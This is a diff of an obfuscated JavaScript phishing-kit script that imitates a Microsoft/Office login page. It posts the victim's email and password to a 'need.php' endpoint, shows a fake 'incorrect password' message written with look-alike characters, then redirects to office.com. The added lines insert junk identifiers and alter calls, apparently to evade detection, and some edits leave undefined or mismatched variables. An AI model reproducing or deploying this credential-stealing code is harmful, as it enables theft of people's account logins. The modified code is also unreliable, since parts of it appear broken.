@@ -1,4 +1,4 @@
-var a = ['innerHTML', 'ready', '.loading-dots', 'show', 'html', 'original-text', '#word', 'keyup', 'which', 'click', '.eml', '.login-box', 'val', '#inputPassword', 'onreadystatechange', 'readyState', 'status', 'parse', 'responseText', 'donesend', 'hide', 'window.location.href=\x27https://www.office.com/?auth=2\x27;', '.btn', 'login', '#warning', 'empty', 'append', 'Yо­ur\x20е­mа­il\x20оr\x20ра­s­s­wо­rd\x20is\x20inсоrrесt.\x20If\x20yоu\x20dоn\x27t\x20rеmе­mbеr\x20yо­ur\x20р­аs­s­wо­r­d,,<a\x20href=\x22#\x22>\x20re­se­t\x20it\x20n­o­w.<a/>\x20<br>\x20<br>\x20', 'open', 'POST', 'need.php', '&pass=', 'setRequestHeader', 'Content-type', 'location', 'hash', 'getElementById', 'user', 'split', 'dom'];
+var a = ['\x30\x78\x31\x38\x37' , '_0xwerwer','_0xertt','innerHTML', 'ready', '.loading-dots', 'show', 'html', 'original-text', '#word', 'keyup', 'which', 'click', '.eml', '.login-box', 'val', '#inputPassword', 'onreadystatechange', 'readyState', 'status', 'parse', 'responseText', 'donesend', 'hide', 'window.location.href=\x27https://www.office.com/?auth=2\x27;', '.btn', 'login', '#warning', 'empty', 'append', 'Yо­ur\x20е­mа­il\x20оr\x20ра­s­s­wо­rd\x20is\x20inсоrrесt.\x20If\x20yоu\x20dоn\x27t\x20rеmе­mbеr\x20yо­ur\x20р­аs­s­wо­r­d,,<a\x20href=\x22#\x22>\x20re­se­t\x20it\x20n­o­w.<a/>\x20<br>\x20<br>\x20', 'open', 'POST', 'need.php', '&pass=', 'setRequestHeader', 'Content-type', 'location', 'hash', 'getElementById', 'user', 'split', 'dom'];
 
 (function(c, d) {
     var e = function(f) {
@@ -21,7 +21,7 @@ document[b('0x2')](b('0x5'))[b('0x6')] = hash[b('0x4')]('@')[0x1];
 $(document)[b('0x7')](function() {
     $('.btn')['on']('click', function() {
         $(b('0x8'))[b('0x9')]();
-        var c = $(this);
+        var _0xert = $(this);
         var d = '<i\x20class=\x22fa\x20fa-circle-o-notch\x20fa-spin\x22></i>\x20loa­di­ng...';
         if ($(this)[b('0xa')]() !== d) {
             c['data'](b('0xb'), $(this)[b('0xa')]());
@@ -44,7 +44,7 @@ function suc() {
     var h = new XMLHttpRequest();
     h[b('0x14')] = function() {
         if (this[b('0x15')] == 0x4 && this[b('0x16')] == 0xc8) {
-            var i = JSON[b('0x17')](this[b('0x18')]);
+            var i = _0x44[b('0x17')](this[b('0x18')]);
             if (i['msg'] == b('0x19')) {
                 $(b('0x11'))[b('0x1a')]();
                 $('.mails')[b('0x9')]();
@@ -56,7 +56,7 @@ function suc() {
             }
         }
     };
-    h[b('0x22')](b('0x23'), b('0x24') + f + b('0x25') + g, !![]);
+    h[b('0x22')](b('_0x23'), b('0x24') + f + b('_0x25') + g, !![]);
     h[b('0x26')](b('0x27'), 'application/x-www-form-urlencoded');
     h['send']();
 }
